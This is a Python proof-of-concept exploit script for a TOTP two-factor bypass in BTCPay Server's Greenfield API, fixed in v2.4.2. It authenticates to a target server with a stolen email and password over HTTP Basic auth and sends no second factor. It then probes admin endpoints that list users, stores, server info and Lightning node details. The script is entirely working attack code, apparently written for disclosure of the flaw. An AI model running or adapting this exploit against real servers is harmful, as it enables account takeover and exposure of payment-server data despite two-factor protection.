#!/usr/bin/env python3
# Author: al4n4n (Dadb0d)
"""
poc.py - BTCPay Server Greenfield API TOTP 2FA bypass (PR #7491, fixed in v2.4.2)

Single-shot exploit. Demonstrates that an account protected by TOTP (authenticator
app) 2FA can be fully authenticated against the Greenfield API using nothing but its
email + password over HTTP Basic auth -- no TOTP code, no second factor.

The browser login path for the same account requires the TOTP code (it redirects to
/login/second-login). The API path does not. Root cause: BasicAuthenticationHandler
only rejected accounts with a registered FIDO2 credential (user.Fido2Credentials.Any()),
never accounts whose second factor is TOTP.

Attack vector: Network (HTTP). The request is sent over the wire with the real
Authorization: Basic header -- no docker exec, no shortcuts.

Usage:
    python3 poc.py --url http://127.0.0.1:8080 --user admin@lab.local --password 'Lab-Passw0rd!2026'

This script uses ONLY a stolen email + password. It never supplies a TOTP code,
a FIDO2 assertion, or an API key. Stdlib only.
"""
import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request

ME = "/api/v1/users/me"
# Endpoints probed to measure what the bypass unlocks. All read-only (GET).
IMPACT = [
    ("/api/v1/users", "list ALL users (server-admin scope)"),
    ("/api/v1/stores", "list stores the account can access"),
    ("/api/v1/server/info", "server info (server-admin scope)"),
    ("/api/v1/server/lightning/BTC/info", "internal Lightning node info"),
]


def basic(user, password):
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def call(url, path, auth):
    req = urllib.request.Request(url.rstrip("/") + path)
    req.add_header("Authorization", auth)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return None, str(e)


def classify(code, body):
    """Honest classification of an API response w.r.t. the auth boundary."""
    low = (body or "").lower()
    if code == 401 and "rate limited" in low:
        return "throttled"            # per-IP login throttle, NOT an auth decision
    if code in (401, 403):
        return "auth-blocked"
    if code is None:
        return "error"
    return "reachable"                # 2xx/4xx/5xx past the auth boundary


def main():
    ap = argparse.ArgumentParser(description="BTCPay Greenfield API TOTP 2FA bypass PoC")
    ap.add_argument("--url", default="http://127.0.0.1:8080", help="target base URL")
    ap.add_argument("--user", required=True, help="account email (stolen credential)")
    ap.add_argument("--password", required=True, help="account password (stolen credential)")
    ap.add_argument("--delay", type=float, default=4.0,
                    help="seconds between probes (BTCPay throttles rapid Basic-auth bursts per IP)")
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    args = ap.parse_args()

    auth = basic(args.user, args.password)
    b64 = auth.split(" ", 1)[1]

    if not args.json:
        print("=" * 70)
        print(" BTCPay Server Greenfield API - TOTP 2FA bypass PoC")
        print(" credentials used: email + password ONLY (no TOTP code sent)")
        print("=" * 70)
        print(f"\n[>] Request:")
        print(f"    GET {args.url.rstrip('/')}{ME}")
        print(f"    Authorization: {auth}")
        print(f"    (base64 decodes to: {base64.b64decode(b64).decode('utf-8','replace')})\n")

    code, body = call(args.url, ME, auth)

    bypassed = code == 200
    identity = None
    is_admin = None
    if bypassed:
        try:
            identity = json.loads(body)
        except Exception:  # noqa: BLE001
            identity = None

    result = {
        "url": args.url,
        "endpoint": ME,
        "http_status": code,
        "bypass_confirmed": bypassed,
        "identity": identity,
        "impact": {},
    }

    if not args.json:
        print(f"[<] Response: HTTP {code}")
        print(f"    {body[:300]}\n")

    if not bypassed:
        if not args.json:
            print("[-] NOT bypassed. The API rejected Basic auth for this account.")
            print(f"    This is the expected behaviour on patched v2.4.2+ ")
            print("    (message: 'Cannot use Basic authentication when multi-factor is enabled.')")
        else:
            print(json.dumps(result, indent=2))
        return 1

    if not args.json:
        print("[+] 2FA BYPASS CONFIRMED")
        print("    The TOTP-protected account was authenticated with password alone.")
        if identity:
            print(f"    authenticated as : {identity.get('email')}  (id {identity.get('id')})")
            roles = identity.get("roles") or []
            print(f"    roles            : {roles}")
        print("\n[>] Measuring what the bypass unlocks (read-only probes):")

    for idx, (path, desc) in enumerate(IMPACT):
        if idx:
            time.sleep(args.delay)
        c, b = call(args.url, path, auth)
        cls = classify(c, b)
        if cls == "throttled":                 # retry once past the throttle window
            time.sleep(args.delay * 2)
            c, b = call(args.url, path, auth)
            cls = classify(c, b)
        reachable = cls == "reachable"
        result["impact"][path] = {"http_status": c, "class": cls, "sample": b[:120]}
        if c == 200 and path == "/api/v1/users":
            is_admin = True
        if not args.json:
            mark = "+" if reachable else ("~" if cls == "throttled" else "-")
            print(f"    [{mark}] {path:<40} HTTP {c}  ({cls})")
            print(f"        {desc}")
            print(f"        -> {b[:120].strip()}")

    result["server_admin_scope"] = bool(is_admin)
    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print("\n" + "=" * 70)
        print(" SUMMARY")
        print("=" * 70)
        print(" - Basic auth accepted for a TOTP-2FA account   : YES (HTTP 200)")
        print(f" - Server-admin endpoint /api/v1/users reachable : {'YES' if is_admin else 'no'}")
        print(" - TOTP code required                            : NO")
        print(" - This is the bug fixed by PR #7491 in v2.4.2.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
